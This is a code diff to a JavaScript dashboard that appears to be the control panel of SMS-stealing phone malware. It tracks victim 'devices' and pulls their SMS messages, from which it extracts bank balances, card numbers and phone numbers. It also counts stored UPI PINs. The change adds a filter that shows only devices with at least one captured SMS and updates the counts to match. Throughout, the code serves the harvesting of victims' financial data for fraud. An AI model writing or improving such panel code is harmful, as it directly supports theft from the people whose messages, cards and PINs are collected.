@@ -1669,6 +1669,18 @@ function getAllDevicePhones(dev){
   return list;
 }
 
+/* ═══ Helper — returns true only when the device has at least 1 SMS ═══ */
+function hasSmsMessages(dev){
+  var sd = S.smsData[dev.id];
+  if (sd && typeof sd.messageCount === 'number') return sd.messageCount > 0;
+  var entry = SMS_CACHE.get(devCacheKey(dev));
+  if (entry){
+    if (entry.analyzed && typeof entry.analyzed.messageCount === 'number') return entry.analyzed.messageCount > 0;
+    if (Array.isArray(entry.messages)) return entry.messages.length > 0;
+  }
+  return false;
+}
+
 function matchDeviceByPhoneQuery(dev, rawQuery){
   if (!rawQuery) return null;
   var qTrim = rawQuery.trim().toLowerCase();
@@ -1899,7 +1911,8 @@ function analyzeAllSms(messages){
   return {
     bankBalances: banks, cards: cards,
     phoneNumbers: Array.from(phoneMap.entries()).map(function(e){ return { number: e[0], isStarred: e[1] }; }),
-    networks: Array.from(nets)
+    networks: Array.from(nets),
+    messageCount: messages.length
   };
 }
 
@@ -2150,7 +2163,7 @@ var SMS_QUEUE = {
     var self = this;
     if (self.queue.length === 0 && self.active === 0){
       self.running = false;
-      if (S.filter === 'bank' || S.filter === 'card' || S.filter === 'phone' || S.phoneSearch){
+      if (S.filter === 'all' || S.filter === 'bank' || S.filter === 'card' || S.filter === 'phone' || S.phoneSearch){
         renderDevices();
       }
       return;
@@ -2184,16 +2197,29 @@ var SMS_QUEUE = {
     }
 
     var activePhoneQuery = S.phoneSearch || (normDigits(S.search).length >= 4 ? S.search : '');
-    if (S.filter === 'bank' || S.filter === 'card' || S.filter === 'phone' || activePhoneQuery){
+    if (S.filter === 'bank' || S.filter === 'card' || S.filter === 'phone' || activePhoneQuery || S.filter === 'all'){
       var matches = false;
       if (activePhoneQuery){
         matches = !!matchDeviceByPhoneQuery(dev, activePhoneQuery);
       } else if (S.filter === 'bank'){
-        matches = sd && sd.bankBalances && sd.bankBalances.length > 0;
+        matches = !!(sd && sd.bankBalances && sd.bankBalances.length > 0);
       } else if (S.filter === 'card'){
-        matches = sd && sd.cards && sd.cards.length > 0;
+        matches = !!(sd && sd.cards && sd.cards.length > 0);
       } else if (S.filter === 'phone'){
         matches = getAllDevicePhones(dev).length > 0;
+      } else if (S.filter === 'all'){
+        if (hasSmsMessages(dev)){
+          if (S.search){
+            var q = S.search.toLowerCase();
+            matches = (dev.name||'').toLowerCase().indexOf(q) !== -1
+              || (dev.id||'').toLowerCase().indexOf(q) !== -1
+              || (dev.phone||'').toLowerCase().indexOf(q) !== -1
+              || (dev.provider||'').toLowerCase().indexOf(q) !== -1
+              || !!matchDeviceByPhoneQuery(dev, S.search);
+          } else {
+            matches = true;
+          }
+        }
       }
       if (matches && !S.currentFilteredList.some(function(x){ return x.id === dev.id && x._url === dev._url; })){
         if (S.currentFilteredList.length === 0){
@@ -2268,7 +2294,7 @@ function loadOneSms(dev, isPriority){
   function tryPath(i){
     if (i >= paths.length){
       S.smsLoaded[key] = true;
-      S.smsData[dev.id] = S.smsData[dev.id] || { bankBalances:[], cards:[], phoneNumbers:[], networks:[] };
+      S.smsData[dev.id] = S.smsData[dev.id] || { bankBalances:[], cards:[], phoneNumbers:[], networks:[], messageCount: 0 };
       cacheSet(dev, {
         number: deriveNumber(dev, S.smsData[dev.id]),
         messages: [],
@@ -2321,7 +2347,7 @@ function doUpdateStats(){
     var d = S.devices[i];
     if (d.status) on++;
     if (d.upipin) upiCount++;
-    if (getAllDevicePhones(d).length > 0) phoneCount++;
+    if (hasSmsMessages(d) && getAllDevicePhones(d).length > 0) phoneCount++;
     var sd = S.smsData[d.id];
     if (sd){
       if (sd.bankBalances && sd.bankBalances.length) bankCount++;
@@ -2360,7 +2386,7 @@ function updateFilterCounts(){
     var bankCount = 0, cardCount = 0, phoneCount = 0;
     for (var i = 0; i < S.devices.length; i++){
       var d = S.devices[i];
-      if (getAllDevicePhones(d).length > 0) phoneCount++;
+      if (hasSmsMessages(d) && getAllDevicePhones(d).length > 0) phoneCount++;
       var sd = S.smsData[d.id];
       if (sd){
         if (sd.bankBalances && sd.bankBalances.length) bankCount++;
@@ -2380,6 +2406,8 @@ function updateFilterCounts(){
 
 function applyFilters(){
   var f = S.devices;
+  // Hide devices with 0 SMS (only show devices that have at least 1 SMS)
+  f = f.filter(hasSmsMessages);
   if (S.filter === 'online') f = f.filter(function(d){ return d.status; });
   else if (S.filter === 'offline') f = f.filter(function(d){ return !d.status; });
   else if (S.filter === 'phone') f = f.filter(function(d){ return getAllDevicePhones(d).length > 0; });
@@ -2434,7 +2462,7 @@ function renderDevices(){
 
   var stillLoading = SMS_QUEUE.queue.length > 0 || SMS_QUEUE.active > 0;
   var smsProgress = Object.keys(S.smsData).length < S.devices.length;
-  var isSmsDependent = (S.filter === 'bank' || S.filter === 'card' || S.filter === 'phone' || !!S.phoneSearch);
+  var isSmsDependent = (S.filter === 'bank' || S.filter === 'card' || S.filter === 'phone' || !!S.phoneSearch || S.filter === 'all');
   var showProgress = isSmsDependent && stillLoading && smsProgress;
 
   if (showProgress){
